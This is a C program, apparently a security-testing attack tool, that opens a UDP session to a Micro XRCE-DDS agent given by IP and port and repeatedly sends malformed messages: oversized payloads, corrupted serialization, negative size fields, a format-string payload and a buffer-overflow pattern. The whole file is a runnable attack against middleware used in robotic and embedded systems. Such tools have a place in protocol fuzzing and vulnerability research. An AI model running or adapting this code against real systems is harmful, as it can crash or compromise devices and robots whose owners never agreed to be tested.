// Compile: gcc attack_malformed_inject.c -o malformed_inject -lmicroxrcedds_client -lmicrocdr
#include <uxr/client/client.h>
#include <ucdr/microcdr.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define STREAM_HISTORY  8
#define BUFFER_SIZE     UXR_CONFIG_UDP_TRANSPORT_MTU * STREAM_HISTORY

void send_oversized_data(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending oversized data payload...\n");
    
    ucdrBuffer mb;
    uint32_t huge_size = 60000;
    
    uint16_t req_id = uxr_prepare_output_stream(session, stream, datawriter, &mb, huge_size);
    
    if (req_id != UXR_INVALID_REQUEST_ID) {
        for (int i = 0; i < 15000; i++) {
            ucdr_serialize_uint32_t(&mb, 0xDEADBEEF);
        }
        printf("[+] Oversized data sent (request ID: %d)\n", req_id);
    } else {
        printf("[-] Failed to prepare oversized stream\n");
    }
}

void send_malformed_serialization(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending malformed serialization...\n");
    
    ucdrBuffer mb;
    uint32_t size = 256;
    
    uint16_t req_id = uxr_prepare_output_stream(session, stream, datawriter, &mb, size);
    
    if (req_id != UXR_INVALID_REQUEST_ID) {
        ucdr_serialize_uint32_t(&mb, 0xDEADBEEF);
        ucdr_serialize_uint64_t(&mb, 0xCAFEBABEDEADBEEFULL);
        ucdr_serialize_uint32_t(&mb, 99999);
        
        printf("[+] Malformed data sent\n");
    }
}

void send_format_string_attack(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending format string attack payload...\n");
    
    ucdrBuffer mb;
    uint32_t size = 128;
    
    uint16_t req_id = uxr_prepare_output_stream(session, stream, datawriter, &mb, size);
    
    if (req_id != UXR_INVALID_REQUEST_ID) {
        char format_string[] = "%x%x%x%x%x%x%x%x%n";
        ucdr_serialize_string(&mb, format_string);
        
        printf("[+] Format string payload sent\n");
    }
}

void send_negative_sizes(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending negative size values...\n");
    
    ucdrBuffer mb;
    uint32_t size = 128;
    
    uint16_t req_id = uxr_prepare_output_stream(session, stream, datawriter, &mb, size);
    
    if (req_id != UXR_INVALID_REQUEST_ID) {
        ucdr_serialize_int32_t(&mb, -1);
        ucdr_serialize_int32_t(&mb, -2147483648);
        ucdr_serialize_uint32_t(&mb, 0xFFFFFFFF);
        
        printf("[+] Negative size values sent\n");
    }
}

void send_buffer_overflow_pattern(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Attempting buffer overflow pattern...\n");
    
    ucdrBuffer mb;
    uint32_t size = 512;
    
    uint16_t req_id = uxr_prepare_output_stream(session, stream, datawriter, &mb, size);
    
    if (req_id != UXR_INVALID_REQUEST_ID) {
        char pattern[300];
        for (int i = 0; i < 299; i++) {
            pattern[i] = 'A' + (i % 26);
        }
        pattern[299] = '\0';
        
        ucdr_serialize_string(&mb, pattern);
        ucdr_serialize_uint32_t(&mb, 0x41414141);
        ucdr_serialize_uint32_t(&mb, 0x42424242);
        
        printf("[+] Overflow pattern sent\n");
    }
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Malformed Message Injection Attack ===\n");
    printf("Target: %s:%s\n\n", ip, port);
    
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port)) {
        printf("[-] Failed to init transport\n");
        return 1;
    }
    
    uxrSession session;
    uxr_init_session(&session, &transport.comm, 0x0BADC0DE);
    
    if (!uxr_create_session(&session)) {
        printf("[-] Failed to create session\n");
        return 1;
    }
    
    printf("[+] Session created\n");
    
    uint8_t output_buffer[BUFFER_SIZE];
    uxrStreamId reliable_out = uxr_create_output_reliable_stream(&session, output_buffer,
                                                                  BUFFER_SIZE, STREAM_HISTORY);
    
    uint8_t input_buffer[BUFFER_SIZE];
    uxr_create_input_reliable_stream(&session, input_buffer, BUFFER_SIZE, STREAM_HISTORY);
    
    uxrObjectId participant_id = uxr_object_id(0x01, UXR_PARTICIPANT_ID);
    const char* participant_xml = "<dds><participant><rtps><name>malformed_attacker</name></rtps></participant></dds>";
    uxr_buffer_create_participant_xml(&session, reliable_out, participant_id, 0, participant_xml, UXR_REPLACE);
    
    uxrObjectId topic_id = uxr_object_id(0x01, UXR_TOPIC_ID);
    const char* topic_xml = "<dds><topic><name>HelloWorldTopic</name><dataType>HelloWorld</dataType></topic></dds>";
    uxr_buffer_create_topic_xml(&session, reliable_out, topic_id, participant_id, topic_xml, UXR_REPLACE);
    
    uxrObjectId publisher_id = uxr_object_id(0x01, UXR_PUBLISHER_ID);
    uxr_buffer_create_publisher_xml(&session, reliable_out, publisher_id, participant_id, "", UXR_REPLACE);
    
    uxrObjectId datawriter_id = uxr_object_id(0x01, UXR_DATAWRITER_ID);
    const char* datawriter_xml = "";
    uxr_buffer_create_datawriter_xml(&session, reliable_out, datawriter_id, publisher_id, 
                                     datawriter_xml, UXR_REPLACE);
    
    printf("[*] Waiting for entity creation...\n");
    uxr_run_session_until_confirm_delivery(&session, 2000);
    
    printf("\n[*] Starting malformed message attacks...\n\n");
    
    for (int round = 0; round < 5; round++) {
        printf("--- Round %d ---\n", round + 1);
        
        send_oversized_data(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        send_malformed_serialization(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        send_negative_sizes(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        send_format_string_attack(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        send_buffer_overflow_pattern(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        uxr_run_session_time(&session, 1000);
    }
    
    printf("\n[*] Attack completed\n");
    
    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    
    return 0;
}
